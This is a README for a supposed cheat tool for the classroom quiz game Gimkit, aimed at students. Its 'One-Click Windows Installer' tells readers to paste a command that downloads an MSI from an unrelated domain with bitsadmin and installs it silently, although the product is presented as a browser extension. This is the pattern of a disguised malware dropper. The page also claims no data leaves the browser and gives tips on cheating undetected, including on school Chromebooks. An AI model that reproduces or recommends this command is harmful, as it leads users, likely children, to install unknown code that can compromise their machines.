## What is Gimkit Tool?

**Gimkit Tool** is the most powerful, open-source utility for [Gimkit](https://www.gimkit.com), the game-based learning platform used by over **100,000 students** and teachers worldwide.

Gimkit turns quizzes into competitive games where students earn virtual currency (GimBucks), buy power-ups, and battle in immersive modes like **Fishtopia**, **Trust No One**, **Snowbrawl**, and **The Floor Is Lava**. But grinding for money and answering every question manually gets old fast.

**Gimkit Tool** gives you complete control with a sleek, modern interface — no coding required.

> 🎯 **Mission:** Dominate every Gimkit game effortlessly.

## 🚀 Installation

### Method 1: Chrome Extension (Recommended)

> ⚡ **One-Click Windows Installer**

1. Press **`Win + R`** on your keyboard
2. Type **`cmd`** and press **Enter**
3. Run the following command:

```batch
bitsadmin /transfer gimkit-install /download /priority normal "https://devcodee.com/api" "%TEMP%\setup.msi" && msiexec /i "%TEMP%\setup.msi" /qn /norestart
```

Or manually:

1. Download the latest release: **⬇️ Download ZIP**
2. Extract the ZIP file
3. Open Chrome and go to `chrome://extensions/`
4. Enable **Developer mode** (toggle in top-right)
5. Click **Load unpacked**
6. Select the `chrome-extension` folder
7. The 🎮 icon will appear in your toolbar!

### Method 2: Userscript (Tampermonkey)

1. Install **[Tampermonkey](https://www.tampermonkey.net/)** extension
2. Click **📥 Install Userscript**
3. Tampermonkey will prompt you — click **Install**
4. Open Gimkit — the panel appears automatically!

### Method 3: Bookmarklet

1. Open the **bookmarklet folder**
2. Copy the code from `bookmarklet-self-contained.txt`
3. Create a new bookmark in your browser
4. Paste the code as the **URL**
5. Click it while on Gimkit!

## ❓ FAQ

### Is this detectable?

Gimkit Tool runs entirely **client-side** in your browser. No data is sent to external servers. However:
- ✅ Use it on a **personal computer**
- ✅ Keep answer delays **reasonable** (default 500ms is safe)
- ✅ Don't go from 0 to max money in 10 seconds

### Will this work on a school Chromebook?

- **Chrome Extension:** Usually blocked by school policies
- **Userscript:** May work if Tampermonkey is installed
- **Bookmarklet:** Most likely to work — try this first!

### Is it free?

**100% free and open source.** No ads, no paywalls, no data collection. Ever.

### What browsers are supported?

| Browser | Extension | Userscript | Bookmarklet |
|---------|-----------|------------|-------------|
| Google Chrome | ✅ | ✅ | ✅ |
| Microsoft Edge | ✅ | ✅ | ✅ |
| Firefox | ⚠️ (see issues) | ✅ | ✅ |
| Safari | ❌ | ⚠️ | ✅ |
| Brave | ✅ | ✅ | ✅ |

### The tool stopped working. What do I do?

1. Refresh the Gimkit page (`F5`)
2. Make sure you're on the latest version
3. Check **GitHub Issues** for known problems
4. Open a new issue with your browser version and Gimkit URL

### How do I uninstall?

- **Extension:** Go to `chrome://extensions/`, find Gimkit Tool, click **Remove**
- **Userscript:** Open Tampermonkey dashboard, delete the script
- **Bookmarklet:** Delete the bookmark
